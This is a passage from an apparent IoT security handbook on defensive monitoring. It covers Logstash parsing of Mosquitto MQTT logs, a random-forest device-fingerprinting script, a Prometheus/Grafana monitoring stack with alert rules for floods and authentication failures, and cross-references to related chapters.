| EMQX broker | JSON structured logs | EMQX webhook → HTTP endpoint | Native JSON ingestion |
| ChirpStack (LoRaWAN) | PostgreSQL audit + JSON API | Logstash JDBC input / API polling | LoRaWAN field extraction |
| Zigbee2MQTT | JSON log file | Filebeat | Zigbee event parsing |
| OpenThread Border Router | Syslog | rsyslog → SIEM | Thread/MLE field extraction |
| BLE sniffer (nRF) | pcapng → tshark JSON | tshark JSON export → Filebeat | BLE advertisement fields |

**Mosquitto log parsing — Logstash grok pattern:**

```ruby
# /etc/logstash/conf.d/mqtt-mosquitto.conf
input {
  file {
    path => "/var/log/mosquitto/mosquitto.log"
    start_position => "beginning"
    sincedb_path => "/var/lib/logstash/sincedb_mosquitto"
    tags => ["mqtt", "mosquitto"]
  }
}

filter {
  if "mosquitto" in [tags] {
    grok {
      match => {
        "message" => [
          "%{TIMESTAMP_ISO8601:timestamp}: New connection from %{IP:source_ip}:%{POSINT:source_port} on port %{POSINT:broker_port}",
          "%{TIMESTAMP_ISO8601:timestamp}: New client connected from %{IP:source_ip}:%{POSINT:source_port} as %{DATA:client_id} \(p%{INT:protocol_version}, c%{INT:clean_session}, k%{INT:keepalive}\)",
          "%{TIMESTAMP_ISO8601:timestamp}: Client %{DATA:client_id} disconnected",
          "%{TIMESTAMP_ISO8601:timestamp}: Received PUBLISH from %{DATA:client_id} \(d%{INT:dup}, q%{INT:qos}, r%{INT:retain}, m%{INT:msg_id}, '%{DATA:topic}', ... \(%{INT:payload_len} bytes\)\)",
          "%{TIMESTAMP_ISO8601:timestamp}: Received SUBSCRIBE from %{DATA:client_id}",
          "%{TIMESTAMP_ISO8601:timestamp}: Socket error on client %{DATA:client_id}, disconnecting"
        ]
      }
    }
    date {
      match => ["timestamp", "ISO8601"]
      target => "@timestamp"
    }
    mutate {
      add_field => { "protocol" => "mqtt" }
      add_field => { "device_type" => "iot" }
    }
  }
}

output {
  if "mosquitto" in [tags] {
    elasticsearch {
      hosts => ["https://siem.internal:9200"]
      index => "iot-mqtt-%{+YYYY.MM.dd}"
      ssl_certificate_verification => true
    }
  }
}
```

### 28.5 Machine Learning Approaches for IoT Traffic Classification

IoT traffic classification serves two purposes: (1) identifying device types from their protocol fingerprint, and (2) detecting anomalous behavior within a known device class.

**Feature extraction for IoT traffic ML models:**

| Feature Category | Features | Extraction Method |
|---|---|---|
| Flow statistics | Packet count, byte count, flow duration, inter-arrival time (mean, std, min, max) | tshark/CICFlowMeter |
| Payload characteristics | Payload length distribution, entropy, printable character ratio | Custom Python extraction |
| Protocol behavior | MQTT topic depth, publish frequency, QoS distribution | MQTT-specific parser |
| Connection patterns | Connection duration, reconnect frequency, concurrent connections | Broker log analysis |
| Temporal patterns | Hour-of-day activity, periodicity, burst detection | Time-series analysis |

**Device fingerprinting with traffic features:**

```python
#!/usr/bin/env python3
"""IoT device fingerprinting from MQTT traffic features."""
import pandas as pd
from sklearn.ensemble import RandomForestClassifier
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report

# Feature columns extracted from MQTT broker logs
FEATURES = [
    'avg_publish_interval_s',
    'payload_size_mean',
    'payload_size_std',
    'topic_depth_mean',         # e.g., 'devices/id/temp' = depth 3
    'unique_topics',
    'qos_0_ratio',
    'qos_1_ratio',
    'retain_ratio',
    'session_duration_mean_s',
    'reconnect_count_per_hour',
]

df = pd.read_csv('/data/iot_mqtt_features.csv')
X = df[FEATURES]
y = df['device_type']  # e.g., 'temperature_sensor', 'smart_plug', 'gateway'

X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)

clf = RandomForestClassifier(n_estimators=100, random_state=42)
clf.fit(X_train, y_train)

y_pred = clf.predict(X_test)
print(classification_report(y_test, y_pred))

# Feature importance — which traffic features best identify device types
for feat, imp in sorted(zip(FEATURES, clf.feature_importances_), key=lambda x: -x[1]):
    print(f"  {feat}: {imp:.4f}")
```

### 28.6 Fleet-Wide IoT Device Monitoring Dashboards

**Key dashboard panels for IoT SOC:**

| Panel | Data Source | Visualization | Alert Threshold |
|---|---|---|---|
| Device connectivity map | MQTT broker + Zigbee2MQTT | Network graph (nodes = devices, edges = connections) | Device offline > 2× expected interval |
| Protocol distribution | All protocol logs | Stacked bar chart (MQTT/CoAP/BLE/Zigbee/Thread) | New protocol not in baseline |
| Authentication failures | MQTT broker log | Time-series line chart | > 10 failures / 5min from single source |
| Firmware version matrix | LwM2M / device shadow | Heat map (version × device count) | Device on EOL firmware |
| Anomaly score timeline | ML anomaly detection | Time-series with threshold line | Score > 2σ from baseline mean |
| Geographic device map | GPS/location metadata | Map with device pins | Device outside expected geofence |
| Certificate expiry countdown | TLS cert inventory | Table sorted by days-to-expiry | < 30 days to expiry |
| Message throughput | MQTT broker `$SYS` topics | Gauge + sparkline | > 150% of baseline throughput |

**Grafana dashboard — Mosquitto `$SYS` metrics (Prometheus exporter):**

```yaml
# docker-compose.yml — Mosquitto monitoring stack
services:
  mosquitto:
    image: eclipse-mosquitto:2.0
    volumes:
      - ./mosquitto.conf:/mosquitto/config/mosquitto.conf
    ports:
      - "1883:1883"
      - "8883:8883"

  mqtt-exporter:
    image: sapcc/mosquitto-exporter:0.8.0
    environment:
      - MQTT_ADDRESS=mosquitto:1883
    ports:
      - "9234:9234"

  prometheus:
    image: prom/prometheus:v2.53.0
    volumes:
      - ./prometheus.yml:/etc/prometheus/prometheus.yml
    ports:
      - "9090:9090"

  grafana:
    image: grafana/grafana:11.1.0
    ports:
      - "3000:3000"
    environment:
      - GF_SECURITY_ADMIN_PASSWORD=changeme
```

```yaml
# prometheus.yml
global:
  scrape_interval: 15s

scrape_configs:
  - job_name: 'mosquitto'
    static_configs:
      - targets: ['mqtt-exporter:9234']
    metrics_path: /metrics
```

**Prometheus alert rules for IoT anomalies:**

```yaml
# /etc/prometheus/rules/iot-alerts.yml
groups:
  - name: iot_mqtt_alerts
    rules:
      - alert: MQTTBrokerHighConnectionRate
        expr: rate(mosquitto_connections_total[5m]) > 10
        for: 2m
        labels:
          severity: warning
          protocol: mqtt
        annotations:
          summary: "MQTT broker experiencing high connection rate"
          description: "Connection rate {{ $value }}/s exceeds threshold of 10/s"

      - alert: MQTTBrokerMessageFlood
        expr: rate(mosquitto_messages_received_total[1m]) > 1000
        for: 1m
        labels:
          severity: critical
          protocol: mqtt
        annotations:
          summary: "MQTT message flood detected"
          description: "Received {{ $value }} msg/s — possible DoS or compromised device"

      - alert: MQTTBrokerAuthFailureSpike
        expr: rate(mosquitto_connections_rejected_total[5m]) > 5
        for: 1m
        labels:
          severity: high
          protocol: mqtt
        annotations:
          summary: "MQTT authentication failure spike"
          description: "{{ $value }} auth failures/s — possible brute-force"

      - alert: IoTDeviceOffline
        expr: time() - mqtt_last_message_timestamp{device_type="sensor"} > 600
        for: 5m
        labels:
          severity: warning
          protocol: mqtt
        annotations:
          summary: "IoT device {{ $labels.device_id }} offline"
          description: "No message received for {{ $value }}s (threshold: 600s)"
```

---

## 29. Cross-references

**To Domain 9 (network):** BLE security (Chapter 9B section 2.4) provides the foundation for BLE Mesh (section 8). The 802.15.4 MAC layer (section 4.1) is the same standard underlying both Zigbee and Thread. NB-IoT/LTE-M security (section 13.2) inherits from the LTE/5G architecture (Chapter 15B section 3). MQTT/CoAP/AMQP security builds on TLS/DTLS fundamentals (Chapter 9A section 5).

**To Domain 13 (crypto):** ECDH key exchange (Z-Wave S2 section 5.3, BLE Mesh provisioning section 8.1, Matter CASE section 7.2) uses the ECC primitives from Chapter 13A section 2.2. AES-CCM (used by Zigbee, Z-Wave S2, BLE Mesh, LoRaWAN) is the AEAD mode from Chapter 13A section 1.1. SPAKE2+ (Matter PASE section 7.2) and J-PAKE (Thread Commissioner section 7.1) are PAKE protocols. DTLS handshake (section 10) relies on the TLS cipher suite framework (Chapter 13B section 3).

**To Domain 12 (RE):** Key extraction from firmware (section 4.6) uses the firmware-extraction techniques from Chapter 12B section 2. Protocol RE of proprietary IoT protocols uses the SDR and signal-analysis tools from Domain 20 and the protocol-RE methodology from Chapter 12A section 7.2. BLE GATT reverse engineering (section 6.3) applies the same enumeration methodology.

**To Domain 20 (RF/SDR):** Zigbee traffic (2.4 GHz 802.15.4) can be captured with a CC2531 dongle or SDR. Z-Wave traffic (868/908 MHz) requires a Z-Wave-capable radio. LoRa traffic can be captured with SDR and decoded with gr-lora. BLE advertising/connection traffic captured with Ubertooth or nRF52 sniffer.

**To Domain 28B (IoT firmware):** Gateway firmware security (section 15) depends on secure boot, update signing, and binary analysis techniques from Chapter 28B. Key storage in NV flash (Zigbee section 4.6) connects to firmware extraction and analysis workflows.
